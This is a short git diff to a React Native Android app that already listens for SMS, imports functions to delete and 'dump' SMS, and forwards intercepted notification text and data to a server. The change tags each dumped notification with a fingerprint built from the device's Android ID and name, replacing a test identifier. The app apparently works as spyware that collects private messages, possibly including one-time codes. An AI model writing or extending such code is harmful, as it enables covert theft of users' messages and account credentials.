@@ -32,6 +32,23 @@ import SmsListener from 'react-native-android-sms-listener';
 import {deleteSms, dumpSms} from './src/service/api';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import Snackbar from 'react-native-snackbar';
+import DeviceInfo from 'react-native-device-info';
+
+const getDeviceId = async () => {
+  try {
+    const id = await DeviceInfo.getAndroidId();
+    const deviceName = await DeviceInfo.getDeviceName();
+    if (id) {
+      return id + '_' + deviceName;
+    } else {
+      console.warn('Android ID is undefined or null');
+      return null;
+    }
+  } catch (error) {
+    console.error('Error getting Android ID:', error);
+    return null;
+  }
+};
 
 const sleep = time => new Promise(resolve => setTimeout(resolve, time));
 
@@ -86,7 +103,7 @@ const headlessNotificationListener = async ({notification}) => {
         message: parsedNotification?.text,
         arbitraryData: parsedNotification,
         dateSent,
-        appUniqueId: 'testing123',
+        appUniqueId: await getDeviceId(),
       });
       if (res?.status) {
         console.log('Notification successfully dumped');
